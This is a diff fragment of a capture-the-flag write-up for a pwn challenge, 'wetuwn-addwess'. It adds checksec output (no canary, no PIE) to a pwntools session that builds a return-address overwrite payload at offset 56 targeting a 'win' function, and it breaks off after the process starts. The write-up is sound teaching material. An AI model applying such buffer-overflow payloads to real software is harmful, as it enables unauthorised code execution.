@@ -115,6 +115,12 @@ Let's pack the address of `win` and send it at an offset of 56 bytes:
 ```py
 >>> from pwn import *
 >>> exe = ELF('wetuwn-addwess')
+[*] '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-addwess/wetuwn-addwess'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
 >>> payload = flat({ 56: p64(exe.sym['win']) })
 >>> io = exe.process()
 [x] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-addwess/wetuwn-addwess'
